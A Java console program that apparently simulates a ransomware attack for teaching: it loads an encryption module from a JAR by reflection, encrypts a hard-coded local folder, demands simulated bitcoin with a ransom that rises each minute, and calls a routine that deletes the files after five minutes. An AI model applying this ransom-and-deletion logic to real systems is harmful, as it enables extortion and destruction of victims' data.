import bank.Bank;
import blockchain.Network;
import blockchain.StringUtility;
import blockchain.Wallet;
import console.ConsoleConfiguration;
import console.ConsolePrintUtility;
import user.User;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.PublicKey;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;

public class Console {

    // Victim
    private final User userClueLess;
    // Attacker
    private final User userEd;
    private final double initialBalance;
    // Console Application
    private final ConsolePrintUtility printUtility;
    // Data and Psychological Pressure
    private final String directory = "C:/Users/ara112588/Desktop/data";
    private boolean isRunning;
    private String input;
    // Reflection
    private Class clazz;
    private Object instance;
    private Object port;
    private boolean isEncrypted;
    private double amount;
    private int minute;

    public Console() {
        loadClazzFromJavaArchive();

        this.printUtility = new ConsolePrintUtility();

        if(this.directory.equals("")) {
            System.out.println("+++ Please change the path of the dedicated directory before running this application. +++");
            System.exit(0);
        }

        // Victim
        this.userClueLess = new User("Clue Less", Bank.generateBankAccount("Clue Less", 5000), new Wallet());

        // Attacker
        this.userEd = new User("Ed", Bank.generateBankAccount("Ed", 0), new Wallet());
        this.initialBalance = userEd.getWallet().getBalance();

        // Psychological Pressure
        this.isEncrypted = false;
        this.amount = 0.02755;
        this.minute = 0;

        // Console Application
        printUtility.printInitApplication();
        while (!isRunning) {
            this.input = handleInput();

            if (input.equals("help")) {
                this.isRunning = true;
                printUtility.printHelpMenu();
                try {
                    initConsoleApplication();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static void main(String[] args) {
        new Console();
    }

    private void initConsoleApplication() throws Exception {

        while (isRunning) {
            this.input = handleInput();

            switch (input) {
                case "help" -> printUtility.printHelpMenu();
                case "show balance", "show b" -> showBalance();
                case "show recipient", "show r" -> getRecipientInfo();
                case "check payment", "check" -> checkPayment();
                case "launch http://www.trust-me.mcg/report.jar", "launch" -> startEncryption();
                case "exit" -> exitProgramm();
                default -> {
                }
            }

            if (input.startsWith("exchange ")) {
                input = input.toLowerCase();
                input = input.replaceAll("\\s+", " ");

                if (input.contains(","))
                    input = input.replace(",", ".");

                input = input.replace("exchange", "");

                if (input.contains("btc"))
                    input = input.replace("btc", "");

                try {
                    double exchange = Double.parseDouble(input);
                    exchangeBTC(exchange);

                } catch (NumberFormatException ex) {
                    System.out.println("Please check your input.");
                }


            } else if (input.startsWith("pay ")) {
                input = input.replaceAll("\\s+", " ");
                input = input.replace("pay ", "");

                if (input.contains("BTC"))
                    input = input.replace("BTC", "");

                if (input.contains("to"))
                    input = input.replace("to", "");

                String[] data = input.split("\\s+");

                try {
                    double amount = Double.parseDouble(data[0].replace("\\s+", ""));
                    String recipient = data[1].replace("\\s+", "");
                    payBTC(amount, recipient);

                } catch (NumberFormatException ex) {
                    System.out.println("Please check your input.");
                }
            }
        }
    }

    // Handle menu
    private void showBalance() {
        System.out.format("Your bank account balance:\t%.2f Euro\n", userClueLess.getBankAccount().getBalance());
        System.out.format("Your wallet balance:\t\t%.5f BTC\n", userClueLess.getWallet().getBalance());
    }

    private void getRecipientInfo() {
        System.out.println("Recipient:\t" + StringUtility.getStringFromKey(userEd.getWallet().getPublicKey()));
    }

    private void exchangeBTC(double amount) {
        double currentBalance = userClueLess.getBankAccount().getBalance();
        double exchangeInEuro = amount / 0.000019;

        if (currentBalance >= exchangeInEuro) {
            userClueLess.getBankAccount().setBalance(currentBalance - exchangeInEuro);
            Network.getInstance().buyBitcoin(userClueLess.getWallet(), amount);
        }
    }

    private void payBTC(double amount, String recipient) {
        Network.getInstance().addTransaction(userClueLess.getWallet().sendFunds((PublicKey) StringUtility.getKeyFromString(recipient), amount));
    }

    private void checkPayment() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        System.out.println(userEd.getWallet().getBalance());
        if (isEncrypted) {
            if ((userEd.getWallet().getBalance() >= (this.initialBalance + amount)) && Network.getInstance().isChainValid()) {
                System.out.println("Transaction successful! Your files will be decrypted.");
                Method encryptMethod = port.getClass().getDeclaredMethod("startDecryption");
                encryptMethod.invoke(port);
            } else {
                System.out.println("You need to pay me the full amount!");
                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (amount - (userEd.getWallet().getBalance()) - initialBalance));
            }
        } else {
            System.out.println("What payment do you want to check? Have you tried launching http://www.trust-me.mcg/report.jar?");
        }
    }

    private void startEncryption() throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
        Method encryptMethod = port.getClass().getDeclaredMethod("startEncryption", String.class);
        Boolean returnValue = (Boolean) encryptMethod.invoke(port, directory);
        if (returnValue) {
            startTimer();
            isEncrypted = true;
        } else {
            System.out.format("Your files already have been encrypted. Pay %.5f BTC to start the decryption.\n", amount);
        }
    }

    private void exitProgramm() {
        System.out.println("We will now shut down the program.");
        this.isRunning = false;
        System.exit(0);
    }

    // Handle timer
    private void startTimer() {
        Timer timer = new Timer();

        timer.schedule(new TimerTask() {
            public void run() {
                switch (minute) {
                    case 1, 2, 3 -> {
                        setAmount(amount + 0.01);
                        System.out.format("Amount to pay increased by 0,01 to %.5f BTC.\n", amount);
                    }
                    case 4 -> {
                        setAmount(amount + 0.01);
                        System.out.format("Pay %.5f BTC immediately or your files will be irrevocably deleted.\n", amount);
                    }
                    case 5 -> {
                        System.out.println("Now your files will be irrevocably deleted.");
                        try {
                            Method encryptMethod = port.getClass().getDeclaredMethod("deleteAllFiles");
                            encryptMethod.invoke(port);
                        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
                            e.printStackTrace();
                        }
                        timer.cancel();
                        System.exit(0);
                    }
                    default -> {
                    }
                }
                minute++;
            }
        }, 0, 60 * 1000);
    }


    // Handle input
    private String handleInput() {
        Scanner in = new Scanner(System.in);
        return in.nextLine();
    }

    // Handle report access
    private void loadClazzFromJavaArchive() {
        try {
            URL[] urls = {new File(ConsoleConfiguration.instance.subFolderPathOfJavaArchive).toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, Console.class.getClassLoader());
            clazz = Class.forName(ConsoleConfiguration.instance.nameOfClass, true, urlClassLoader);
            instance = clazz.getMethod("getInstance").invoke(null);
            port = clazz.getDeclaredField("port").get(instance);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Handle Getter and Setter
    public void setAmount(double amount) {
        this.amount = amount;
    }
}